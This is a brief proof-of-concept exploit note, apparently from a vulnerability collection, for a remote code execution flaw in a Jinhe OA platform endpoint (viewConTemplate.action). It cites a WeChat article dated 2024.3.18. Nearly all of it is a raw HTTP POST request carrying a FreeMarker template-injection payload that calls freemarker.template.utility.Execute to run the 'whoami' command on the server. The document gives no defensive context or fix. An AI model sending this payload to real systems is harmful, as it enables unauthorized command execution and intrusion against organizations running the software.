# jinhe_viewConTemplate.action_rce

from: https://mp.weixin.qq.com/s/Tnk1sSdvdFyRnluz1DJl6A
2024.3.18 @2

```
POST /jc6/platform/portalwb/portalwb-con-template!viewConTemplate.action HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

moduId=1&code=<clob>${"freemarker.template.utility.Execute"?new()("whoami")}</clob>&uuid=1
```
